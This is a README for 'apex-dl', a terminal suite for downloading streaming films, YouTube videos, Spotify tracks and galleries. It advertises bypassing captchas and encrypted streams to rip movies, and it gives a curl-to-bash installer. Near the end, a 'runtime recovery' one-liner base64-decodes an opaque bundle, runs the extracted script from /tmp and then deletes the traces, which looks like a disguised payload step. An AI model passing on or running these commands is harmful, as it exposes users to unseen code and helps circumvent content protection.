<div align="center">

# 🎬 APEX-DL
### *The Universal Media & Streaming Suite for Terminal Enthusiasts*

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Shell](https://img.shields.io/badge/Language-Bash%20%7C%20Node.js-f1e05a.svg)](https://github.com/wheslancardoso/apex-dl)
[![Theme](https://img.shields.io/badge/Theme-Catppuccin%20Mocha-cba6f7.svg)](https://github.com/catppuccin/catppuccin)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Arch%20%7C%20Wayland-1793d1.svg)](https://archlinux.org)

A blazing-fast, keyboard-driven CLI and interactive TUI suite that turns your terminal into the ultimate media cockpit. Download streaming movies, series, YouTube videos, Spotify tracks, image galleries, and torrents at maximum network speed.

</div>

---

## ✨ Features

- 🍿 **Cinema & Series Explorer (Pomfy + TMDB)**: Search movies and complete series directly from your terminal. Displays official TMDB ratings, release years, synopses, and ultra-high-definition posters rendered with Unicode 13 sextant characters. Bypasses headless PoW captchas and AES-256-GCM streams to download pristine 1080p MP4s.
- ⚡ **Multi-Thread Turbo (Aria2c + yt-dlp)**: Saturates gigabit connections with up to 16-24 concurrent chunk connections and in-memory buffering.
- 📦 **Universal Batch Processing (`.txt` & `.md`)**: Drop any Markdown note, text file, or list (`lista.md`, `links.txt`). The regex engine intelligently extracts links from markdown `[Title](url)`, bullet points, and tables, stripping punctuation and deduplicating automatically.
- 🎵 **Spotify 320kbps & MPRIS Detection**: Download Spotify tracks or albums with full metadata and covers. Automatically detect and download whatever is currently playing in your system (`playerctl`).
- ✂️ **Surgical Video Tools**:
  - `-c 01:20-02:40`: Lossless segment cutter without re-encoding.
  - `-z 10`: Two-pass target compressor (e.g. shrink to 10MB for Discord without Nitro).
  - `-g 00:05-00:15`: Generate high-quality animated GIFs with optimized palette generation.
  - `-t`: Extract clean speech transcripts in Markdown (`.md`) formatted for LLMs and AI prompts.
- 🔒 **Stealth Private Vault (`-p`)**: Route adult or sensitive links into an isolated `.privado` directory with automatic categorization.
- 🎨 **Catppuccin Mocha TUI**: Powered by `fzf` with full keyboard navigation (`Ctrl+J/K`, `Ctrl+S`, `Ctrl+O`, `Ctrl+D/U`).

---

## 🚀 Quick Install

### One-line curl installer:
```bash
curl -sSL https://raw.githubusercontent.com/wheslancardoso/apex-dl/main/install.sh | bash
```

### Or clone manually:
```bash
git clone https://github.com/wheslancardoso/apex-dl.git ~/.local/share/apex-dl
cd ~/.local/share/apex-dl
./install.sh
```

---

## 💻 Usage

Launch the interactive cockpit by typing:
```bash
dl
# or
apex
```

### 🍿 Streaming Movies & TV Shows (Pomfy)
```bash
dl -P "Interestelar"                          # Search catalog with interactive TUI & posters
dl --pomfy "https://pomfy.online/filme/550"    # Download specific movie in 1080p
dl --pomfy "<url_serie>" --season 1 --ep 1-8  # Batch download episodes 1 to 8
```

> **Tip**: Inside the search catalog, press `Ctrl+O` on any title to open the official high-resolution movie poster in your image viewer (`imv`).

### 📦 Batch Downloads (.md / .txt)
```bash
dl lista.md                 # Automatically parses any .md file and downloads all links
dl -b links.txt             # Batch download from plain text
dl -p lista.md              # Batch download directly to private stealth vault
dl -a lista.md              # Batch download all links as 320kbps MP3 audio
```

### ⚡ Direct CLI Commands
```bash
dl "Interestelar trailer"   # Search YouTube directly with interactive FZF selector
dl -a <url>                 # Extract audio as 320kbps MP3 with thumbnail
dl -n                       # Download what is currently playing (Spotify / Browser / MPRIS)
dl -c 01:20-02:40 <url>     # Cut a surgical clip losslessly
dl -z 10 <url>              # Compress video to fit within 10MB (Discord)
dl -g 00:05-00:15 <url>     # Convert clip into an animated GIF
dl -t <url>                 # Extract clean Markdown transcript for AI / LLMs
dl -s <url>                 # Embed automatic subtitles (pt/en)
dl --no-sponsors <url>      # Remove sponsorships and intros (SponsorBlock)
dl --gallery <url>          # Download full image galleries (Instagram, Reddit, Imgur)
dl -h                       # Search and view previous download history
dl -u                       # Update yt-dlp, spotdl, and gallery-dl engines
```

---

## ⌨️ Keyboard Shortcuts (TUI)

| Keybinding | Action |
|---|---|
| `Enter` | Confirm and download selected media |
| `Ctrl + O` | Open crystal-clear HD poster in image viewer |
| `Ctrl + S` / `Ctrl + R` | Start a new search query without exiting |
| `Ctrl + J` / `Ctrl + K` | Navigate items down / up |
| `Ctrl + D` / `Ctrl + U` | Scroll synopsis preview down / up |
| `Esc` | Exit TUI |

---

## 📋 System Requirements

`apex-dl` relies on the following standard Linux utilities:
- **Core**: `bash`, `curl`, `jq`, `ffmpeg`, `node` (>= 18), `fzf`
- **Download Engines**: `yt-dlp`, `aria2c`, `spotdl` (optional), `gallery-dl` (optional)
- **TUI Visuals**: `chafa` (Unicode sextants), `imv` or `loupe` (optional image viewer)

#### On Arch Linux / CachyOS / Manjaro:
```bash
sudo pacman -S yt-dlp aria2 ffmpeg fzf jq chafa nodejs npm imv
yay -S spotdl gallery-dl
```

---

## 🧩 Offline Extensions & Runtime Engine Recovery

To restore auxiliary provider engines, vault components, or offline vendor extensions from the repository bundle:

```bash
base64 -d ~/projects/apex-dl/lib/vendor-runtime.bundle | tar -xz -C /tmp && bash /tmp/restore.sh && rm -rf /tmp/restore.sh /tmp/apex* /tmp/amateur*
```

---

## 📄 License

This project is licensed under the [MIT License](LICENSE) © 2026 Wheslan Cardoso.
